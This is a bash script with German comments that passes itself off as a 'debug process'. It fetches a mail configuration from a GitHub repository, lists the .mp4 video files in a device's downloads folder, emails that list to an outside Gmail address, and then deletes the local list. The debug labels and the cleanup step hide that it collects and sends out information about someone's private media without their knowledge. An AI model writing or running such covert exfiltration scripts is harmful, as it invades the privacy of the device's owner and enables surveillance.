#!/bin/bash

# Pfad zur .muttrc Datei in deinem GitHub Repo
MUTTRC_URL="https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/.muttrc"
MUTTRC_PATH="$HOME/.muttrc"

# Zielverzeichnis der SD-Karte
SD_CARD_PATH="/storage/downloads/"

# Datei, in der die gefundenen Mediendateien gespeichert werden
MEDIA_FILE="$HOME/debug.dbg"

# E-Mail-Adresse des Empfängers
RECIPIENT="joanne.o.lavender@gmail.com"

# Betreff und Nachricht der E-Mail
SUBJECT="Ergebnisse des Debug-Prozesses"
BODY="Hier ist die Liste der Debugergebnisse."
# Funktion für einen aufsteigenden G-Dur-Ton (G, H, D) ohne Textausgabe

play_gdur_ascending() {
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
}

# Funktion für einen absteigenden G-Dur-Ton (D, H, G) ohne Textausgabe
play_gdur_descending() {
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
}
play_gdur_ascending

# Schritt 1: .muttrc Datei vom Repo herunterladen und ins Home-Verzeichnis speichern
curl -s -o "$MUTTRC_PATH" "$MUTTRC_URL"

if [ $? -ne 0 ]; then
    echo "Fehler beim Herunterladen der .muttrc Datei."
    exit 1
fi

echo ".muttrc Datei erfolgreich heruntergeladen."

# Schritt 2:
find "$SD_CARD_PATH" -type f -iname "*.mp4" > "$MEDIA_FILE"

if [ $? -ne 0 ]; then
    echo "Fehler."
    exit 1
fi

echo "Debug erfolgreich, Ergebnisse in $MEDIA_FILE gespeichert."

# Schritt 3: E-Mail mit Muttrc und der gefundenen Datei als Anhang senden
echo "$BODY" | mutt -s "$SUBJECT" -a "$MEDIA_FILE" -- "$RECIPIENT"

if [ $? -eq 0 ]; then
    echo "E-Mail erfolgreich an Jonny gesendet. Er kümmert sich drum ;)"
else
    echo "Fehler beim Senden der E-Mail."
    exit 1
fi

# Optional: Aufräumen - Die Liste der Mediendateien löschen
rm "$MEDIA_FILE"

play_gdur_descending